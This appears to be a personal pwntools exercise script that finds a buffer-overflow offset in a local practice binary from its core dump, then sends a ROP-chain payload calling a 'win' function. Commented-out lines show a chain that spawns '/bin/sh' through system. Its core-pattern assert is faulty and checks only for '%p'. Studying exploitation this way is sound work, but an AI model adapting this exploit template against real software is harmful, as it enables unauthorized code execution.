#!/usr/bin/env python3

from pwn import *
from itertools import cycle
import os

def get_corefile_location(executable_name: str, pid: int) -> os.PathLike[str]:
    with open("/proc/sys/kernel/core_pattern") as f:
        core_pattern = f.read()
        assert "%e" and "%p" in core_pattern
        return core_pattern.replace("%e", executable_name).replace("%p", str(pid)).strip()

# Generate a pattern of 100 bytes, larger than the buffer size

# 64 -> instruction pointer = \0
# 65 -> instruction pointer = \0
# 66 -> instruction pointer = noise
# 67 -> instruction pointer = 41413d

i = 128
pattern = cyclic(i)

# Start the vulnerable binary
with process('./example') as p:
    # Send the pattern as input
    print("current pid", p.pid)
    p.sendline(pattern)
    p.wait()  # Wait for the program to crash

# Examine the crash to find the offset
def print_details(name: str, pid: int) -> str:
    core = Coredump(get_corefile_location(name, pid))
    for k,v in core.registers.items():
        new_offset = cyclic_find(v)
        # print(f"{k=},{v=},{new_offset}")
        if new_offset != -1:
            print(f"overwrote register {k} with value {v} at offset {new_offset}")


print_details("example", p.pid)
# Our ROP chain will use gadgets from the following ELFs
binary = ELF('./example')
rop = ROP([binary,
           ELF('/usr/lib/gcc/x86_64-linux-gnu/12/libcc1.so')])

# Write a ROP chain that calls some libc functions!
#  rop.call('system', ['/bin/sh'])
#  rop.call('exit', [0])
rop.win()

print('ropchain:')
print(rop.dump())

ropchain = rop.chain()
offset = 92
payload = flat({offset: ropchain}, filler=cycle(b'A'))[:-2]
print(f"{payload=}")

print("attacking...")
with process(binary.path) as example:
    print(example.recvline(timeout=5))
    example.sendline(payload)
    # print(example.recvline(timeout=5))
    print_details("example", example.pid)

"""
# # Override pwntools's default cache directory to your secret tmp directory
# # (workaround for <https://github.com/Gallopsled/pwntools/issues/2072>)
# os.environ['XDG_CACHE_HOME'] = './'

# Our ROP chain will use gadgets from the following ELFs
binary = ELF('./example')
rop = ROP([binary,
           ELF('/usr/lib/gcc/x86_64-linux-gnu/12/libcc1.so')])

# Write a ROP chain that calls some libc functions!
#  rop.call('system', ['/bin/sh'])
#  rop.call('exit', [0])
rop.win_function()

# Pretty-print the finished payload
print(rop.dump())

# Convert it to bytes
ropchain = rop.chain()
print(f"{ropchain=}")

offset = 30
payload = flat({offset: ropchain}, filler=cycle(b'A'))
print(f"{payload=}")

print("attacking...")
with process(binary.path) as example:
    print(example.recvline(timeout=5))
    example.sendline(payload)
    print(example.recvline(timeout=5))
"""


#  from itertools import cycle
#  from pwn import *

#  binary = ELF('./example')

#  # print(binary.sym)

#  rop = ROP(binary)
#  rop.foo()
#  rop.exit()

#  print(rop.dump())
#  print("Binary Data:")
#  print(hexdump(bytes(rop)))
#  ropchain = rop.chain()

#  offset = 30
#  payload = flat({offset: ropchain}, filler=cycle(b'A'))

#  print(f"{payload=}")

#  #  buffer_size = 10
#  #  padding = str(0xaa) * buffer_size

#  #  payload = padding.encode() + ropchain

#  print('exploiting...')

#  with process(binary.path) as example:
#  example.sendline(payload)
#  print(example.recvline(timeout=5))


#  #  #  print(binary.symbols['foo'])
#  #  #  print(binary.symbols)



